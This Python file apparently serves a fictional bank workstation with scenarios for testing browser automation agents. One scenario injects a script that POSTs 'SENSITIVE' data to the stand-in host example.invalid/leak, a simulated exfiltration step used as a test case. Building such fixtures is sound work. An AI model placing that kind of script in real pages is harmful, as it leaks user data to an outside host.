"""Fictional, server-rendered workstation. Automation has no access to this module's data."""

from __future__ import annotations

import asyncio
import html
import socket
from contextlib import asynccontextmanager
from uuid import uuid4

import uvicorn
from fastapi import FastAPI, Form, HTTPException, Request
from fastapi.responses import HTMLResponse, RedirectResponse

STYLE = """body{font:16px system-ui;background:#f3f1ea;color:#243c3c;margin:32px}
h1,h2{font-family:Georgia,serif}table{border-collapse:collapse;background:white;width:100%;max-width:720px}
th,td{text-align:left;padding:14px 20px;border-bottom:1px solid #ddd}button,input{font:inherit;padding:10px}
button{background:#23594e;color:white;border:0;cursor:pointer}input{border:1px solid #77938c}
header{border-bottom:3px solid #ae7933;padding-bottom:12px}iframe{width:100%;height:630px;border:0}
a{color:#23594e}input{box-sizing:border-box;width:100%;min-width:0}
:focus-visible{outline:3px solid #ae7933;outline-offset:3px}
@media(max-width:600px){body{margin:16px}th,td{padding:12px 8px;overflow-wrap:anywhere}
button{max-width:100%}h1{font-size:28px}}
small{color:#576c64}[role=dialog]{padding:24px;border:3px solid #ae7933;background:#fff3da}"""


def page(body):
    if "<h1>" not in body and "<h2>Member search</h2>" not in body:
        body += '<p><a href="/desk/search">New member search</a></p>'
    return HTMLResponse(
        f'<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Branch workstation</title><style>{STYLE}</style></head><body>{body}</body></html>'
    )


def button(label, path):
    return f'<form method="post" action="{path}"><button>{label}</button></form>'


MEMBERS = {"00123": "$1,204.57", "00456": "$8,902.10"}
SCENARIOS = (
    "normal",
    "tenant_b",
    "expired",
    "notice",
    "dialog",
    "slow",
    "failed",
    "duplicate",
    "wrong_member",
    "malformed_money",
    "native_dialog",
    "external_request",
    "external_redirect",
)


def create_app(scenario="normal"):
    if scenario not in SCENARIOS:
        raise ValueError("unknown demo scenario")
    app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)
    sessions = {}
    app.state.sessions = sessions
    app.state.finalizations = 0

    def render(body):
        if scenario == "tenant_b":
            body = (
                body.replace('name="workbench"', 'name="operations"')
                .replace("Find member", "Search member")
                .replace("View accounts", "Account overview")
                .replace("Available balance", "Withdrawable funds")
            )
        return page(body)

    def session(request):
        sid = request.cookies.get("workstation")
        if sid not in sessions:
            raise HTTPException(409, "Open the workstation to start a session.")
        return sessions[sid]

    def accounts():
        return (
            "<h2>Account directory</h2><table><tr><th>Product</th><th>Action</th></tr><tr><td>Savings</td><td>"
            + button("Open savings ledger", "/desk/savings")
            + "</td></tr></table>"
            + button("Start sub-account", "/desk/subaccount")
        )

    @app.get("/health")
    def health():
        return {"ok": True}

    @app.get("/")
    def home():
        sid = uuid4().hex
        sessions[sid] = {}
        response = render(
            '<header><small>FICTIONAL TRAINING ENVIRONMENT · NO REAL ACCOUNTS</small><h1>Juniper Branch Workstation</h1></header><iframe name="workbench" title="Member operations" src="/desk/search"></iframe>'
        )
        response.set_cookie("workstation", sid, httponly=True, samesite="strict")
        return response

    @app.get("/desk/search")
    def search_page():
        form = '<h2>Member search</h2><form method="post" action="/desk/search"><table><tr><th><label for="member">Member identifier</label></th><td><input id="member" name="member_key" autocomplete="off" required></td></tr></table><p><button>Find member</button></p></form>'
        if scenario == "duplicate":
            form += "<button>Find member</button>"
        return render(form)

    @app.post("/desk/search")
    def search(request: Request, member_key: str = Form()):
        session(request)["member"] = member_key
        if member_key == "00000":
            return render("<h2>Validation error</h2><p>The identifier is reserved.</p>")
        if member_key == "00888":
            return render("<h2>Permission denied</h2>")
        if member_key not in MEMBERS:
            return render("<h2>Member not found</h2>")
        return render(
            "<h2>Search results</h2><p>One matching member.</p>"
            + button("Open member", "/desk/member")
        )

    @app.post("/desk/member")
    def member(request: Request):
        key = session(request).get("member", "")
        return render(
            "<h2>Member summary</h2><table><tr><th>Member identifier</th><td>"
            + html.escape(key)
            + "</td></tr><tr><th>Member name</th><td>SYNTHETIC PERSON NEVER LOG</td></tr></table>"
            + button("View accounts", "/desk/accounts")
        )

    @app.post("/desk/accounts")
    def open_accounts(request: Request):
        state = session(request)
        if not state.get("resolved"):
            if scenario == "expired":
                return render(
                    "<h2>Session expired</h2><p>Training session requires an operator renewal.</p>"
                    + button("Renew session", "/desk/renew")
                )
            if scenario == "notice":
                return render(
                    "<h2>Service notice</h2>" + button("Dismiss service notice", "/desk/continue")
                )
            if scenario == "dialog":
                return render(
                    '<section role="dialog" aria-label="Supervisor review"><h2>Supervisor review</h2>'
                    + button("Acknowledge review", "/desk/ack")
                    + "</section>"
                )
            if scenario == "slow":
                return render(
                    '<h2>Loading accounts</h2><script>setTimeout(()=>location.href="/desk/ready",600)</script>'
                )
            if scenario == "failed":
                return render("<h2>Service unavailable</h2>")
            if scenario == "native_dialog":
                return render('<script>confirm("Unrecognized confirmation")</script>' + accounts())
            if scenario == "external_request":
                return render(
                    '<script>fetch("https://example.invalid/leak",{method:"POST",body:"SENSITIVE"}).catch(()=>{})</script>'
                    + accounts()
                )
            if scenario == "external_redirect":
                return RedirectResponse("https://example.invalid/", status_code=303)
        return render(accounts())

    @app.get("/desk/ready")
    def ready():
        return render(accounts())

    @app.post("/desk/renew")
    @app.post("/desk/continue")
    @app.post("/desk/ack")
    def resolve(request: Request):
        session(request)["resolved"] = True
        return render(accounts())

    @app.post("/desk/savings")
    def savings(request: Request):
        key = session(request).get("member", "")
        balance = MEMBERS.get(key, "")
        if scenario == "wrong_member":
            key = "00777"
        if scenario == "malformed_money":
            balance = "$NaN"
        return render(
            "<h2>Savings ledger</h2><table><tr><th>Member identifier</th><td>"
            + html.escape(key)
            + "</td></tr><tr><th>Available balance</th><td>"
            + balance
            + "</td></tr><tr><th>Internal note</th><td>PRIVATE-NOTE-DO-NOT-PERSIST</td></tr></table>"
            + button("Finalize account closure", "/desk/finalize")
        )

    @app.post("/desk/finalize")
    def finalize(request: Request):
        session(request)
        app.state.finalizations += 1
        return render("<h2>Account closed</h2>")

    @app.post("/desk/subaccount")
    def subaccount(request: Request):
        session(request)
        return render(
            '<h2>Sub-account setup</h2><form method="post" action="/desk/subaccount/review"><label for="nickname">Sub-account nickname</label><input id="nickname" name="nickname" maxlength="40" required><button>Review sub-account</button></form>'
        )

    @app.post("/desk/subaccount/review")
    def review_subaccount(request: Request, nickname: str = Form()):
        key = session(request).get("member", "")
        return render(
            "<h2>Sub-account confirmation</h2><table><tr><th>Member identifier</th><td>"
            + html.escape(key)
            + "</td></tr><tr><th>Nickname</th><td>"
            + html.escape(nickname)
            + "</td></tr><tr><th>Review status</th><td>Ready for confirmation</td></tr></table>"
            + button("Create sub-account", "/desk/subaccount/create")
        )

    @app.post("/desk/subaccount/create")
    def create_subaccount(request: Request):
        session(request)
        app.state.finalizations += 1
        return render("<h2>Sub-account created</h2>")

    return app


@asynccontextmanager
async def serve_demo(scenario="normal"):
    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    app = create_app(scenario)
    server = uvicorn.Server(
        uvicorn.Config(app, log_level="error", access_log=False, lifespan="off")
    )
    task = asyncio.create_task(server.serve(sockets=[sock]))
    try:
        async with asyncio.timeout(5):
            while not server.started:
                if task.done():
                    await task
                await asyncio.sleep(0.01)
        yield f"http://127.0.0.1:{port}", app
    finally:
        server.should_exit = True
        try:
            await task
        finally:
            sock.close()
